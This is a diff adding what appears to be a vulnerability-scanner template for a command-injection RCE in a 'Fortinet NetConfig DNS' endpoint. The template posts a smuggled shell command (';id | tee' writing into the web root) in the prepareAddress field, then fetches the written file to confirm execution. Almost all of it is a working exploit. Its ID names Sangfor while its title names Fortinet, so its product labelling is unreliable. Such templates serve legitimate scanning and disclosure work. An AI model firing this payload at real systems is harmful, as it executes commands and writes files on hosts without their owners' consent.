@@ -1,0 +1,37 @@
+id: SANGFOR-add_DNs_rce
+
+info:
+  name: Fortinet NetConfig DNS RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template exploits a command injection vulnerability in the NetConfig DNS configuration of Fortinet systems to write a file to a specific location and then retrieves it to confirm exploitation.
+  tags: fortinet,rce,critical
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: inject_payload
+    method: POST
+    path:
+      - "{{BaseURL}}/fort/system;help/netConfig/add_DNS"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Connection: keep-alive
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+    body: |
+      prepareAddress=;id | tee /usr/local/tomcat/webapps/fort/trust/version/hello1.txt;&firstAddress=8.8.8.8
+  - id: confirm_payload
+    method: GET
+    path:
+      - "{{BaseURL}}/fort/trust/version/hello1.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "uid="
+          - "gid="
